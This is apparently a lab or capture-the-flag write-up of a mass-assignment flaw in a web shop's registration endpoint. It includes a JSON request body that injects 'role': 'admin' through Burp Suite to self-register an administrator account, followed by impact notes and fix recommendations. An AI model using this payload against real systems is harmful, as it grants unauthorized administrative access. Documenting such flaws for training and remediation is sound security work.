# Challenge 2 — Admin Registration (Mass Assignment)

| Field | Detail |
|---|---|
| **OWASP Category** | A04 – Insecure Design / A01 – Broken Access Control |
| **Severity** | Critical |
| **Technique** | Mass Assignment via intercepted registration request |

---

## Background

Mass assignment occurs when an API binds incoming request fields directly to internal model properties without restricting which fields are permitted. If sensitive fields like `role` are not explicitly blocked, an attacker can supply them in the request body and have them written to the database.

---

## Discovery

A standard registration request was submitted and the HTTP 201 response revealed the full internal user object:

```json
{
  "role": "customer",
  "email": "kazuto@kirigaya.sao",
  ...
}
```

The presence of the `role` field in the response indicated it exists on the user model and may be writable via the same endpoint.

---

## Exploit

The registration request was intercepted in Burp Suite and `"role": "admin"` was injected into the request body before forwarding:

```json
{
  "email": "kazuto@kirigaya.sao",
  "password": "abc123",
  "passwordRepeat": "abc123",
  "role": "admin",
  "securityQuestion": { ... },
  "securityAnswer": "abc123"
}
```

The server accepted the request and created the account with administrator privileges. No prior access was required.

---

## Impact

- Any anonymous visitor can self-register an admin account
- Bypasses all role-based access control
- Grants immediate access to the admin panel and all privileged API endpoints
- Requires zero prior knowledge — only Burp Suite and one registration attempt

---

## Video

[Watch on Loom](#) [Admin Registration](https://www.loom.com/share/22cb45e3031e4165bef256105c175df0)

---

## Recommendation

- Implement an explicit allowlist of accepted fields on the registration endpoint
- Assign roles server-side unconditionally — never trust client-supplied role values
- Remove internal fields like `role` from API responses where not required by the client
